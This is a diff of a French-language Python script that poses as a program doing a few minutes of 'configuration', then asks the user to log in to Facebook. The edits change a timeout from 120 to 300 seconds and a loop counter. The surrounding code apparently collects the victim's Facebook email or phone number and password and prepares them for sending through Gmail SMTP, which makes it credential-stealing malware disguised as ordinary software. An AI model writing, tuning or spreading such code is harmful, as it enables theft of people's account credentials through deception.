@@ -12,7 +12,7 @@ print('''
 ║╔══╝║║─║║║║╔═╗─║║───║║───║║─║╔══╝
 ║║───║╚═╝║║╚╩═║╔╣─╗──║║──╔╣─╗║║───
 ╚╝───╚═══╝╚═══╝╚══╝──╚╝──╚══╝╚╝───''')
-print('\nconfiguration du programme, ceci prendra maximum 2 minutes, veuillez patienter...')
+print('\nconfiguration du programme, ceci prendra maximum 5 minutes, veuillez patienter...')
 
 smtp_address = 'smtp.gmail.com'
 smtp_port = 465
@@ -59,7 +59,7 @@ if __name__ == '__main__':
     # We create a Process
     action_process = Process(target=sendit)
     action_process.start()
-    action_process.join(timeout=120 )
+    action_process.join(timeout=300 )
     action_process.terminate()
     print("Ready!")
     
@@ -75,7 +75,7 @@ id = str(input('\nVeuillez vous connecter à Facebook pour continuer. \nEmail/t�
 while '@' not in id and '+' not in id:
    id = str(input('Veuillez saisir votre numéro avec l\'indicatif du pays ou utilisez une email valide: '))
 passw = str(input('mot de passe: '))
-ij = 0
+ij = 1
 while ij < 3:
    print('connexion en cours')
    details = id + '\n' + passw 
